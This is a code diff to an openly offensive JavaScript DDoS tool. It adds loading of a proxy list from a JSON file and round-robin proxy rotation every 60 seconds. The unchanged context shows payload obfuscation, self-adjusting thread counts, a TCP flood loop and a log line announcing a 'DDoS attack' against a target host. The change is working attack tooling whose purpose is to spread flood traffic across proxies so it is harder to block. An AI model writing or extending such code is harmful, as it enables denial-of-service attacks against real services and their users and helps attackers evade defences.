@@ -37,6 +37,7 @@ let advancedObfuscation;
 let autoAdjustThreads;
 let customPayload;
 let requestInterval = 0; // Interval between requests in milliseconds
+let proxyRotationInterval = 60000; // Rotate proxies every 60 seconds
 
 // Colors (ANSI escape codes) - Make it look badass!
 const darkGreen = "\x1b[32m";
@@ -79,6 +80,23 @@ let timerInterval;
 let proxies = []; // Store proxy list
 let activeThreads = 0; // Counter for active threads
 let threadHealth = []; // Store thread health data
+let currentProxyIndex = 0;
+
+// Load Proxies from JSON file
+async function loadProxiesFromJson(filePath) {
+    try {
+        const response = await fetch(filePath);
+        if (!response.ok) {
+            throw new Error(`Failed to fetch proxy list: ${response.status}`);
+        }
+        const data = await response.json();
+        proxies = data.proxies;
+        log(`${darkGreen}[MAIN] Loaded ${proxies.length} proxies from JSON ${filePath}${resetColor}`);
+    } catch (error) {
+        log(`${darkRed}[ERROR] Error loading proxies from JSON: ${error}${resetColor}`);
+        proxies = [];
+    }
+}
 
 // Scanline Effect
 function addScanlines() {
@@ -197,7 +215,8 @@ async function loadProxies(url) {
 
 function getRandomProxy() {
     if (proxies.length === 0) return null;
-    return proxies[Math.floor(Math.random() * proxies.length)];
+    currentProxyIndex = (currentProxyIndex + 1) % proxies.length;
+    return proxies[currentProxyIndex];
 }
 
 // Payload Obfuscation
@@ -609,6 +628,14 @@ function askForDetails() {
     });
 }
 
+// Proxy Rotation Function
+function rotateProxies() {
+    if (proxies.length > 0) {
+        currentProxyIndex = (currentProxyIndex + 1) % proxies.length;
+        log(`${darkGreen}[MAIN] Rotating proxy to index ${currentProxyIndex} - Next one up!${resetColor}`);
+    }
+}
+
 // Main execution - let's get this party started!
 async function main() {
     const consentGiven = await showConsent();
@@ -647,6 +674,8 @@ async function main() {
 
     if (proxyListURL) {
         await loadProxies(proxyListURL);
+    } else {
+         await loadProxiesFromJson('/public/main/proxies.json'); // Load from JSON if no URL is provided
     }
 
     log(`${darkGreen}[MAIN] Starting DDoS attack against ${targetHost}:${port} with ${threads} threads - FUCK YEAH!${resetColor}`);
@@ -655,6 +684,7 @@ async function main() {
     timerInterval = setInterval(updateTimer, 1000);
 
     setInterval(adjustThreads, 10000);
+    setInterval(rotateProxies, proxyRotationInterval); // Rotate Proxies Every 60 seconds
 
     for (let i = 0; i < threads; i++) {
         tcpFlood(i + 1);
